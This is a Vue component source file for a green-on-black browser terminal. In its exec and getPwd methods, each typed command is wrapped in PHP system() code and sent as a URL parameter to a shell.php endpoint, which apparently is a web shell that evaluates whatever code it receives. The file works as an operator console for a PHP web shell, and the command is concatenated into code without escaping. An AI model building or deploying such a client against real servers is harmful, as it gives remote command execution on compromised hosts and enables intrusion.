<template>
    <div class="content"
         ref="content"
         :style="fontSizeStyle"
         :themes="currentColor"
         @wheel="zoomFontSize">
        <div class="option-bar">
            <div class="themes">
                <span>主题：</span>
                <div class="theme" v-for="item of themes" :style="{background:item.color}"
                     @click="currentColor = item.class"></div>
            </div>
            <div class="zoom">
                <span>100%</span>
                <svg @click="fontSize--" t="1606139969145" class="icon zoom-in" viewBox="0 0 1024 1024" version="1.1"
                     xmlns="http://www.w3.org/2000/svg" p-id="4996" width="200" height="200">
                    <path d="M785.06666667 473.16385185h-546.13333334c-21.35988148 0-38.83614815 17.47626667-38.83614815 38.83614815 0 10.67994075 4.36906667 20.38897778 11.40811852 27.42802963 7.03905185 7.03905185 16.74808889 11.40811852 27.42802963 11.40811852h546.13333334c21.35988148 0 38.83614815-17.47626667 38.83614815-38.83614815s-17.47626667-38.83614815-38.83614815-38.83614815z"
                          p-id="4997" fill="#bfbfbf"></path>
                </svg>
                <svg @click="fontSize++" t="1606139987476" class="icon zoom-out" viewBox="0 0 1024 1024" version="1.1"
                     xmlns="http://www.w3.org/2000/svg" p-id="5787" width="200" height="200">
                    <path d="M950.857143 460.8H570.514286V73.142857c0-29.257143-21.942857-58.514286-58.514286-58.514286s-51.2 29.257143-51.2 58.514286v387.657143H73.142857c-29.257143 0-51.2 21.942857-51.2 51.2s21.942857 58.514286 51.2 58.514286h387.657143V950.857143c0 29.257143 21.942857 58.514286 58.514286 58.514286s58.514286-21.942857 58.514285-58.514286V570.514286H950.857143c29.257143 0 58.514286-21.942857 58.514286-58.514286s-29.257143-51.2-58.514286-51.2z"
                          p-id="5788" fill="#bfbfbf"></path>
                </svg>
                <div @click="fontSize = 18" class="button">重置</div>
            </div>
        </div>
        <div class="terminal" ref="terminal" :themes="currentColor">
            <div class="row" v-for="type of row">
                <div class="input-history">
                    <span class="path">{{type.path}}</span>
                    <span class="cmd">{{type.cmd}}</span>
                </div>
                <pre class="result">{{type.result}}</pre>
            </div>
            <div class="row">
                <div class="type-container">
                    <textarea class="type"
                              :style="fontSizeStyle"
                              :themes="currentColor"
                              @input="input($event,type)"
                              @keydown="keydown($event,type)"
                              v-model="type.input">
                    </textarea>
                    <span class="float-pwd" :themes="currentColor">{{type.path}}</span>
                </div>
            </div>
        </div>
    </div>
</template>

<script>

    export default {
        data() {
            return {
                fontSize: 18,
                path: 'D:\\safe\\hw\\2020_09_18',
                row: [],
                type: {},
                urlencode: [
                    {
                        k: '%',
                        v: '%25'
                    }, {
                        k: '&',
                        v: '%26'
                    },
                ],
                themes: [
                    {
                        class: 'green',
                        color: '#00FF00',
                    },
                    {
                        class: 'win',
                        color: '#cccccc',
                    },
                ],
                currentColor: 'green'
            }
        },
        created() {
            let search = location.search.substr(1).split('&')
            let param = search.reduce((p, c, i) => {
                let t = c.split('=')
                p[t[0]] = t[1]
                return p
            }, {})
            this.getPwd(param)
        },
        directives: {
            focus: {
                inserted: function (el) {
                    el.focus()
                }
            }
        },
        computed: {
            fontSizeStyle() {
                return {fontSize: this.fontSize + 'px'}
            }
        },
        methods: {
            zoomFontSize(e) {
                if (e.ctrlKey) {
                    let deltaY = e.deltaY
                    if (deltaY > 0) {
                        this.fontSize--
                        if (this.fontSize < 12) {
                            this.fontSize = 12
                        }
                    } else {
                        this.fontSize++
                    }
                    e.stopPropagation()
                    e.preventDefault()
                }
            },
            async getPwd() {
                let that = this
                let cmd = 'echo %25cd%25'
                let phpCode = 'header("Content-Type: text/html;charset=GBK");system(\'' + cmd + ' 2>%261\');'
                let res = await this.$request('http://localhost/shell.php?c=' + phpCode)
                console.log(JSON.stringify(res))
                res = res.replace('\r\n', '')
                console.log(JSON.stringify(res))
                that.path = res
                that.type = {
                    path: that.path + '>',
                    input: that.path + '>',
                    id: '',
                }
            },
            async exec(event, cmd) {
                console.log(cmd === 'cls')
                if (cmd === '') return
                if (cmd === 'cls' || cmd === 'clear') {
                    this.row = []
                    this.type.input = this.type.path
                    this.type.id = ''
                    return
                }
                let that = this
                let phpCode = 'header("Content-Type: text/html;charset=GBK");system(\'' + cmd + ' 2>%261\');'
                let res = await this.$request('http://localhost/shell.php?c=' + phpCode)
                that.row.push({
                    cmd: cmd,
                    historyInput: that.type.input,
                    path: that.type.path,
                    result: res,
                })
                that.type.input = that.type.path
                // that.$console(that.row)

                that.$nextTick(() => {
                    that.$refs.content.scrollTop = that.$refs.terminal.scrollHeight
                })
            },
            cmdAutoComplete(type, cmd) {
                switch (cmd) {
                    case 'cls':
                        this.row = []
                        this.row.push({
                            tmpPwd: this.pwd + '>',
                            pwd: this.pwd + '>',
                            history: '',
                            result: '',
                        })
                        break
                }

            },
            keydown(event, type) {
                // console.log(event.keyCode);

                let cmd = type.input.substr(type.path.length, type.input.length)
                if (event.keyCode === 13) {
                    event.returnValue = false
                    this.exec(event, cmd)
                }
                //tab键
                if (event.keyCode === 9) {
                    console.log('tab键')
                    this.cmdAutoComplete(type, cmd)
                    event.returnValue = false
                }
                //上键
                if (event.keyCode === 38) {
                    this.$console(this.row)
                    if (this.type.id !== '') {
                        if (this.type.id !== 0) {
                            this.type.id = this.type.id - 1
                            this.type.input = this.row[this.type.id].history
                        } else {
                            this.type.input = this.row[this.row.length - 1].history
                            this.type.id = this.row.length - 1
                        }
                    } else {
                        if (this.row.length) {
                            this.type.input = this.row[this.row.length - 1].history
                            this.type.id = this.row.length - 1
                        }
                    }
                    console.log(this.type.id)
                    return
                }
                //下键
                if (event.keyCode === 40) {
                    console.log(JSON.stringify(this.row, null, 4))
                    console.log(this.type.id)
                    if (this.type.id !== '') {
                        if (this.type.id !== this.row.length - 1) {
                            this.type.id = this.type.id + 1
                            this.type.input = this.row[this.type.id].history
                        } else {
                            this.type.id = 0
                            this.type.input = this.row[this.type.id].history
                        }
                    }
                    return
                }
                //删除键
                if (event.keyCode === 8) {
                    if (type.input === type.path) {
                        event.returnValue = false
                    }
                }
            },
            input(event, type) {
                let textArea = event.target
                if (textArea.scrollHeight > 195) {
                    textArea.style.height = textArea.scrollHeight + 'px'
                }
                if (event.target.value === '') {
                    type.input = type.path
                }
                if (type.input.length < type.path.length) {
                    type.input = type.path
                }
                if (type.input.substr(0, type.path.length) !== type.path) {
                    type.input = type.path
                }
            },
        }
    }
</script>

<style lang="scss" scoped>
    @import "../../assets/scss/color";

    $font-color: rgb(0, 255, 0);

    $win-bg-color: #47494A;
    //$win-bg-color: rgb(60, 63, 65);
    $green-bg-color: #000;
    .content {
        overflow: auto;
        height: 100%;

        &[themes=green] {
            color: #00FF00;
            background: $green-bg-color;
        }

        &[themes=win] {
            color: #CCCCCC;
            background: $win-bg-color;
        }

        .option-bar {
            margin-top: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;

            .themes {
                display: flex;
                align-items: center;


                .theme {
                    margin: 1px;
                    width: 20px;
                    height: 20px;
                    border-radius: 2px;
                }
            }


            .zoom {
                display: flex;
                align-items: center;

                span {
                    font-size: 16px;
                    margin-right: 30px;
                }

                svg {
                    width: 16px;
                    height: 16px;
                    margin: 0 5px;
                    /*cursor: pointer;*/
                }

            }


        }


        .terminal {
            font-family: "Microsoft YaHei UI";

            .row {
                margin-bottom: 20px;

                .type-container {
                    position: relative;

                    .float-pwd {
                        position: absolute;
                        /*left: 0px;*/
                        left: -1px;
                        top: 0;
                        color: #CCCCCC;


                        &[themes=green] {
                            background: $green-bg-color;
                        }

                        &[themes=win] {
                            background: $win-bg-color;
                        }
                    }

                    textarea {
                        resize: none;
                        font-family: "Microsoft YaHei UI";
                        height: 200px;
                        text-align: start;
                        //width: 100px;
                        width: 100%;
                        padding: 0;
                        margin: 0;
                        box-sizing: border-box;
                        border: 0;
                        outline: 0;
                        background: $green-bg-color;

                        &[themes=green] {
                            color: #00FF00;
                            background: $green-bg-color;
                        }

                        &[themes=win] {
                            color: #CCCCCC;
                            background: $win-bg-color;
                        }
                    }
                }

                .input-history {
                    word-break: break-all;

                    .path {
                        // color: rgb(131,148,150);
                        color: #CCCCCC;
                    }
                }

                .result {
                    font-family: "Microsoft YaHei UI";
                    margin: 0;
                }
            }
        }

    }

</style>
